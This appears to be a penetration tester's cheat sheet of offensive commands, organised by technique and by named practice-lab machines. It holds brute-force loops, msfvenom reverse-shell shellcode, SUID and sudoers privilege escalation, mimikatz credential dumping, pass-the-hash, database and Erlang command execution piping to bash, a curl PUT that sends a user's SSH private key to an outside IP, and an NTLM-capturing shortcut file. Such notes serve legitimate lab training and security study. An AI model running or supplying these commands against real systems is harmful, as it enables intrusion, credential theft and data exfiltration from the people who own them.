# Port Scanning ( SYN )
	sudo nmap -p- --open -n -vv -sS -sV -oN fullscan $IP

# Credential Check
	admin:admin
	admin:adminadmin
	
# Found: LFI 
	Try to turn into RCE

# Found: Local user (/etc/passwd)
	Try username as password
	Brute force SSH, FTP (as last resort)

# File upload
	Windows: certutil
	Linux  : wget or curl

# Find a place to write file
	Windows: c:/users/public/downloads or c:/windows/temp
	Linux  : /dev/shm or /tmp

# Code Execution
	Always test with ping ( easiest way to confirm code execution )
	Do not expect every code being executed - Try harder!
	Check firewall rules if possible [LFI] ( /etc/ufw/user.rules )

# Reverse Shell
	Try open ports first (e.g; nc -lnvp 80 )

# Brute Force
	# HTTP post form
	ffuf -X POST -u http://$IP/login.php -d "username=USER&password=PASS&login=" -H "Content-Type: application/x-www-form-urlencoded" -w users:USER -w /usr/share/wordlists/rockyou.txt:PASS -x http://127.0.0.1:8080 -fr 'Wrong username' -ac

	# WordPress plugins ( I failed to use wpscan )
	curl http://plugins.svn.wordpress.org/ -s | perl -lne 'print $1 if /href="(.+?)\/"/' | grep -vE '^http://' > wordpress-plugins.txt
	ffuf -u http://$IP/wp-content/plugins/FUZZ -w wordpress-plugins.txt -c
	
	# SMB brute force ( hydra did not work )
	for user in $(cat usernames); do for pass in $(cat passwords); do smbclient -L $IP -U "$user%$pass"; done; done
	for user in $(cat usernames); do for pass in $(cat passwords); do smbmap -H $IP -u "$user" -p "$pass"; done; done

	# Basic authentication
	[401 Unauthorized] curl http://$IP/svn/
	[403 Forbidden   ] curl http://$IP/svn/     -u "admin:admin"
	[200 OK          ] curl http://$IP/svn/dev/ -u "admin:admin"
	
# PrivEsc
	wmic service where "startname like 'LocalSystem' and not pathname like '%windows%'" get name,startname,startmode,pathname
	cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash;/tmp/rootbash -p

	# Look carefully to find a cronjob running in a small timeframe and check PATH
	cat /etc/crontab
	ls -alhR /etc/cron*

# Buffer Overflow
	$ for i in {1..255}; do printf "\\\x%02x" $i; done;
	$ msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f c -b "$BADCHARS" > shellcode
	$ cat shellcode | grep \" | tr '\n' ' ' | sed -e 's/[" ]//g'

# Active Directory
	$ crackmapexec smb $IP -u $USER -H $HASH --local-auth
	$ smbexec.py USER@IP -hashes $HASH
	# mimikatz
		lsadump::sam
		sekurlsa::logonpasswords

		
# ref: Cobweb
  # find writable folders
  $ find / -type d -writable 2>/dev/null

  # exclude nosuid mounted paths
  mount | grep -v nosuid

# ref: sona
  # find possible passwords
  $ grep -iroE 'password[=>].{5,30}' *

  # find python module path
  $ python3 -c 'import base64; print(base64.__file__)'
  /usr/lib/python3.8/base64.py

# ref: Postfish
  # find group readable files
  $ groups
  $ find / -type f -group $GROUP -readable 2>/dev/null

# ref: Nukem
  $ echo commander ALL=(ALL) ALL >> sudoers

# ref: Hunit
  # only git user has permission to push arbitrary updates to the master branch of a local repository.
  # https://superuser.com/questions/232373/how-to-tell-git-which-private-key-to-use
  # remote operations (e.g, clone/push) must be done via git user's SSH private key, local git operations can be as usual.

  kali$ GIT_SSH_COMMAND='ssh -i id_rsa.git -p 43022' git clone git@$IP:/git-server
  kali$ git add -A
  kali$ git show
  kali$ git commit -m "gimme shell please"
  kali$ GIT_SSH_COMMAND='ssh -i id_rsa.git -p 43022' git push origin master

# ref: Splodge
  # Check git repo
  $ wget http://$IP/.git/index
  $ file index 
  index: Git index, version 2, 81 entries

  # Download git repo ( https://github.com/internetwache/GitTools )
  # https://pentester.land/tutorials/2018/10/25/source-code-disclosure-via-exposed-git-folder.html
  $ ./gitdumper.sh http://$IP/.git/ repo
  $ git status
  $ git checkout -- .
  $ git log

  # https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5
  postgres# CREATE TABLE cmd_exec(cmd_output text);
  postgres# COPY cmd_exec FROM PROGRAM 'id';
  postgres# SELECT * FROM cmd_exec;

# ref: Exfiltrated
  # Exiftool RCE
  # https://github.com/OneSecCyber/JPEG_RCE

# ref: Clyde
  # Erlang Port Mapper Daemon exploit (python)
  # == OR == 
  $ apt install erlang
  $ erl -sname test
  (test@kali)1> erlang:spawn('rabbit@clyde',os,cmd,["echo ...|base64 -d|bash"]).

# ref: Develop
  # PHP Magic Hashes and Type Juggling
  # https://www.whitehatsec.com/blog/magic-hashes/
  $ php -a
  php > var_dump(md5('240610708'));
  string(32) "0e462097431906509019562988736854"
  php > var_dump(md5('240610708') == '0e987654321098765432109876543210');
  bool(true)

  # Data exfiltration ( curl PUT request )
  # Always test with known file locations (e.g; /etc/passwd )
  $ curl${IFS}-T${IFS}/home/franz/.ssh/id_rsa${IFS}192.168.49.82

# ref: Vault
  # If you encounter a writable share, upload a shortcut link pointing to attacker's machine and run responder to catch NTLM hashes
  $ cat <<EOF > @hax.url        
  [InternetShortcut]
  URL=anything
  WorkingDirectory=anything
  IconFile=\\192.168.49.236\%USERNAME%.icon
  IconIndex=1
  EOF

